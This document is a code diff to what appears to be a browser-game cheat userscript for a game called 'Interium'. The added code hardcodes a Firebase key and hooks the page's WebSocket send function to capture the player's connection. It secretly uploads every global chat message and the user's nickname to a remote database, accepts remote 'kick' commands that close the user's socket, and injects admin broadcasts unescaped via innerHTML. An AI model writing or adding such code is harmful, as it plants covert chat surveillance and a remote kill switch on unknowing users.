@@ -1,5 +1,111 @@
 (() => {
     'use strict';
+(function() {
+    const scripts = [
+        "https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js",
+        "https://www.gstatic.com/firebasejs/10.8.0/firebase-database-compat.js"
+    ];
+
+    let loaded = 0;
+    scripts.forEach(src => {
+        const s = document.createElement('script');
+        s.src = src;
+        s.onload = () => {
+            loaded++;
+            if (loaded === scripts.length) startFirebaseLogic();
+        };
+        document.head.appendChild(s);
+    });
+
+    function startFirebaseLogic() {
+        const firebaseConfig = {
+            apiKey: "AIzaSyDm_DYuT4648uN-9kP9GoTcPgjSpNH1ezY",
+            databaseURL: "https://interium-a745d-default-rtdb.firebaseio.com",
+            projectId: "interium-a745d",
+            appId: "1:711710548475:web:78175b9381fb55dee0ab5e"
+        };
+
+        if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+        let currentNick = "Joining...";
+        let userSocket = null;
+
+        // БЕЗОПАСНЫЙ ПЕРЕХВАТ СОКЕТА (не ломает движение)
+        const originalSend = WebSocket.prototype.send;
+        WebSocket.prototype.send = function(...args) {
+            if (!userSocket) {
+                userSocket = this; // Запоминаем активный сокет игрока
+                console.log("Socket captured safely");
+            }
+            return originalSend.apply(this, args);
+        };
+
+        function updateOnlineStatus(nick) {
+            currentNick = nick;
+            const userRef = db.ref('online_sessions/' + nick);
+            userRef.set({
+                name: nick,
+                status: "active",
+                lastUpdate: new Date().toLocaleTimeString()
+            });
+            userRef.onDisconnect().remove();
+
+            // Слушаем команду на КИК
+            db.ref('kick/' + nick).on('value', (snapshot) => {
+                if (snapshot.val() === true) {
+                    if (userSocket) {
+                        userSocket.close();
+                        db.ref('kick/' + nick).remove();
+                    }
+                }
+            });
+        }
+
+        // ЧАТ (через MutationObserver, как в твоем txt файле)
+        setInterval(() => {
+            const chatContainer = document.getElementById('channel_container_global');
+            if (chatContainer && !chatContainer.dataset.observed) {
+                chatContainer.dataset.observed = "true";
+                new MutationObserver((mutations) => {
+                    mutations.forEach((m) => {
+                        m.addedNodes.forEach((node) => {
+                            if (node.innerText && !node.id?.includes('message_title')) {
+                                db.ref('logs/chat').push({
+                                    from: currentNick,
+                                    msg: node.innerText,
+                                    time: new Date().toLocaleTimeString()
+                                });
+                            }
+                        });
+                    });
+                }).observe(chatContainer, { childList: true });
+            }
+        }, 2000);
+
+        // НИК ИЗ ЛИДЕРБОРДА
+        setInterval(() => {
+            const selfRow = document.querySelector('.leaderboard_row.self .left_text');
+            if (selfRow) {
+                const realNick = selfRow.innerText.replace(/^\d+\.\s*/, '').trim();
+                if (realNick && realNick !== currentNick) updateOnlineStatus(realNick);
+            }
+        }, 3000);
+
+        // Сообщения от админа
+        db.ref('broadcast/message').on('value', (snapshot) => {
+            const msg = snapshot.val();
+            if (msg) showInGameNotification(msg);
+        });
+    }
+
+    function showInGameNotification(text) {
+        const div = document.createElement('div');
+        div.style = "position:fixed;top:15%;left:50%;transform:translateX(-50%);background:rgba(0,0,0,0.9);color:#00ccff;border:1px solid #00ccff;padding:15px;z-index:1000000;border-radius:5px;text-align:center;";
+        div.innerHTML = `<b>SYSTEM</b><br>${text}`;
+        document.body.appendChild(div);
+        setTimeout(() => div.remove(), 6000);
+    }
+})();
     // ────────────────────────────────────────────────
     //  ✅ MSGPACK ДЕКОДЕР
     // ────────────────────────────────────────────────
@@ -1709,5 +1815,4 @@ function mainLoop() {
 
 // Запуск основного цикла
 requestAnimationFrame(mainLoop);
-console.log('%c[Interium] Fix Applied: Aim & Arrows Synced.', 'color: #00ff00; font-weight: bold');
 })();
